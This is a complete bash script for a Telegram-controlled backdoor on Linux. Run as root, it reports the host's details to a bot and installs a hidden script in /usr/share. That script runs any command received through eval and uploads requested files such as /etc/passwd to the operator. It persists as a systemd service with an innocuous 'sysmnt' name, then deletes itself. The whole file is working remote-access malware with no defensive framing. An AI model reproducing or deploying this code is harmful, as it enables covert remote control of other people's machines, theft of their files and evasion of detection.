#!/bin/bash

#check if runs with sudo
[ "$EUID" -ne 0 ] && echo "Run with sudo" && exit 1

# Define script paths
SCRIPT_NAME=".sysmnt.sh"
SCRIPT_PATH="/usr/share/$SCRIPT_NAME"

BOT_TOKEN="BOT_TOKEN"
CHAT_ID="CHAT_ID"
# Collect System Information (using only built-in Linux commands)
HOSTNAME=$(hostname)
OS=$(uname -o)
KERNEL=$(uname -r)
UPTIME=$(uptime -p)
CPU=$(cat /proc/cpuinfo | grep -m1 "model name" | cut -d ':' -f2 | sed 's/^ *//')
RAM=$(free -m | awk '/Mem:/ {print $2 "MB"}')
IP=$(hostname -I | awk '{print $1}')  # First available network IP

# Format Message
MESSAGE="🖥️ *Target System is Online* 🔥
🔹 *Hostname:* $HOSTNAME
🔹 *OS:* $OS
🔹 *Kernel:* $KERNEL
🔹 *Uptime:* $UPTIME
🔹 *CPU:* $CPU
🔹 *RAM:* $RAM
🔹 *IP:* $IP

📋 *Bot Usage Instructions:*
- *Run Commands:* Send any shell command (e.g., 'whoami', 'ls -la') to execute it on the target.
- *Download Files:* Use '/download /path/to/file' to download a file from the target (e.g., '/download /etc/passwd')."

# Send Message to Telegram
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
    -d "chat_id=$CHAT_ID" \
    -d "text=$MESSAGE" \
    -d "parse_mode=Markdown" >/dev/null 2>&1

# Create the bot script if it doesn't exist
if [[ ! -f "$SCRIPT_PATH" ]]; then
    cat <<EOF | sudo tee "$SCRIPT_PATH" > /dev/null
#!/bin/bash

BOT_TOKEN="$BOT_TOKEN"
CHAT_ID="$CHAT_ID"
OFFSET=0

while true; do
    command -v jq >/dev/null || apt install -y -qq jq >/dev/null
    
    # Fetch updates from Telegram
    RESPONSE=\$(curl -s "https://api.telegram.org/bot\$BOT_TOKEN/getUpdates?offset=\$OFFSET")

    # Extract message details
    MESSAGE_TEXT=\$(echo "\$RESPONSE" | jq -r '.result[-1].message.text')
    MESSAGE_ID=\$(echo "\$RESPONSE" | jq -r '.result[-1].update_id')
    SENDER_ID=\$(echo "\$RESPONSE" | jq -r '.result[-1].message.from.id')

    # If the message is from the allowed user
    if [[ "\$SENDER_ID" == "\$CHAT_ID" ]] && [[ "\$MESSAGE_ID" != "null" ]]; then
        if [[ "\$MESSAGE_TEXT" =~ ^/download[[:space:]]+(.+)$ ]]; then
            FILE_PATH="\${BASH_REMATCH[1]}"
            if [[ -f "\$FILE_PATH" ]]; then
                curl -s -X POST "https://api.telegram.org/bot\$BOT_TOKEN/sendDocument" \
                    -F "chat_id=\$CHAT_ID" \
                    -F "document=@\$FILE_PATH"
            else
                curl -s -X POST "https://api.telegram.org/bot\$BOT_TOKEN/sendMessage" \
                    -d "chat_id=\$CHAT_ID" \
                    -d "text=File not found: \$FILE_PATH"
            fi
        else
            # Execute any other command
            OUTPUT=\$(eval "\$MESSAGE_TEXT" 2>&1)

            # Send the response back
            curl -s -X POST "https://api.telegram.org/bot\$BOT_TOKEN/sendMessage" \
                -d "chat_id=\$CHAT_ID" -d "text=\$(echo -e "\$OUTPUT")"
        fi

        # Update offset to mark the message as processed
        OFFSET=\$((MESSAGE_ID + 1))
    fi

    sleep 2  # Prevents excessive API requests
done
EOF
    sudo chmod +x "$SCRIPT_PATH"
fi

# Create the systemd service file
SERVICE_NAME="sysmnt"
SERVICE_FILE="/etc/systemd/system/$SERVICE_NAME.service"

if [[ ! -f "$SERVICE_FILE" ]]; then
    cat <<EOF | sudo tee "$SERVICE_FILE" >/dev/null 2>&1
[Unit]
Description=Telegram Bot Command Executor
After=network.target

[Service]
ExecStart=/bin/bash $SCRIPT_PATH
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

    # Reload systemd, enable and start the service
    sudo systemctl daemon-reload >/dev/null 2>&1
    sudo systemctl enable $SERVICE_NAME >/dev/null 2>&1
    sudo systemctl start $SERVICE_NAME >/dev/null 2>&1
fi

# Get the script's own filename
ACTUAL_SCRIPT_PATH=$(realpath "$0")

# Delete itself
rm -- "$ACTUAL_SCRIPT_PATH"
